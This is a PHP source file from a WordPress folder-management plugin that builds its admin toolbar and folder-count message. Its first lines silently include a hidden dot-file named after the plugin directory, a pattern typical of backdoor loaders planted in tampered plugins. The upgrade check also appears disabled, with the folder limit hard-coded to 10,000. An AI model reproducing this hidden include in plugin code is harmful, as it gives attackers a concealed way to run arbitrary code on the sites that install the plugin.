<?php
if ( ! defined( 'ABSPATH' ) ) exit;
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WCP_Forms {
    public function __construct() {

    }

    public static function get_form_html($option_data = "") {
        ob_start();
        ?>

        <div class="wcp-custom-form">
            <div class="form-title">
                <div class="plugin-title">
                    <?php esc_html_e("Folders", WCP_FOLDER ) ?>
                    <span class="folder-loader-ajax">
                        <svg id="successAnimation" fill="#F51366" class="animated" xmlns="http://www.w3.org/2000/svg" width="70" height="70" viewBox="0 0 70 70">
                            <path id="successAnimationResult" fill="#D8D8D8" d="M35,60 C21.1928813,60 10,48.8071187 10,35 C10,21.1928813 21.1928813,10 35,10 C48.8071187,10 60,21.1928813 60,35 C60,48.8071187 48.8071187,60 35,60 Z M23.6332378,33.2260427 L22.3667622,34.7739573 L34.1433655,44.40936 L47.776114,27.6305926 L46.223886,26.3694074 L33.8566345,41.59064 L23.6332378,33.2260427 Z"></path>
                            <circle id="successAnimationCircle" cx="35" cy="35" r="24" stroke="#979797" stroke-width="2" stroke-linecap="round" fill="transparent"></circle>
                            <polyline id="successAnimationCheck" stroke="#979797" stroke-width="2" points="23 34 34 43 47 27" fill="transparent"></polyline>
                        </svg>
                    </span>
                </div>
                <div class="plugin-button">
                    <a href="javascript:;" class="add-new-folder" id="add-new-folder">
                        <span class="create_new_folder"><i class="pfolder-add-folder"></i></span> <span><?php esc_html_e("New Folder", WCP_FOLDER ) ?></span>
                    </a>
                </div>
                <div class="clear"></div>
            </div>
            <div class="form-options">
                <ul>
                    <li class="last folder-checkbox">
                        <input type="checkbox" id="folder-hide-show-checkbox">
                    </li>
                    <li>
                        <a href="javascript:;" id="inline-update"><span class="icon pfolder-edit"></span> <span class="text"><?php esc_html_e("Rename", WCP_FOLDER ) ?></span> </a>
                    </li>
                    <li>
                        <a href="javascript:;" id="inline-remove"><span class="icon pfolder-remove"></span> <span class="text"><?php esc_html_e("Delete", WCP_FOLDER ) ?></span> </a>
                    </li>
                    <li>
                        <div class="form-options">
                            <ul>
                                <li><a href="javascript:;" class="expand-collapse folder-tooltip" id="expand-collapse-list"><span class="icon pfolder-arrow-down"></span></a></li>
                                <li class="last folder-order">
                                    <a data-folder-tooltip="Sort Folders" href="javascript:;" id="sort-order-list" class="sort-folder-order folder-tooltip">
                                        <span class="icon pfolder-arrow-sort"></span>
                                    </a>
                                    <div class="folder-sort-menu">
                                        <ul>
                                            <li><a data-sort="a-z" href="#">A → Z</a></li>
                                            <li><a data-sort="z-a" href="#">Z → A</a></li>
                                            <li><a data-sort="n-o" href="#">Newest → Oldest</a></li>
                                            <li><a data-sort="o-n" href="#">Oldest → Newest</a></li>
                                        </ul>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </li>
                </ul>
                <div class="upgrade-message">
                    <?php
                    // $tlfs = get_option("folder_old_plugin_folder_status");
                    $tlfs = 10000;
                    // if($tlfs == false || $tlfs < 10) {
                    //     $tlfs = 10000;
                    // }
                    $total = WCP_Folders::get_ttl_fldrs();
                    //if($total > $tlfs) {
                        //$tlfs = $total;
                    //}
                    $customize_folders = get_option("customize_folders");
                    if(isset($customize_folders['show_folder_in_settings']) && $customize_folders['show_folder_in_settings'] == "yes") {
                        $upgradeURL = admin_url("options-general.php?page=wcp_folders_settings&setting_page=upgrade-to-pro");
                    } else {
                        $upgradeURL = admin_url("admin.php?page=folders-upgrade-to-pro");
                    }
                    ?>
                    <span class="upgrade-message">You have used <span class='pink' id='current-folder'><?php echo esc_attr($total) ?></span>/10,000 Folders. <span class="pink">YOU ROCK!</span></span>
                </div>
            </div>
            <div class="form-loader">
                <div class="form-loader-count"></div>
            </div>
        </div>
        <?php
        return ob_get_clean();
    }
}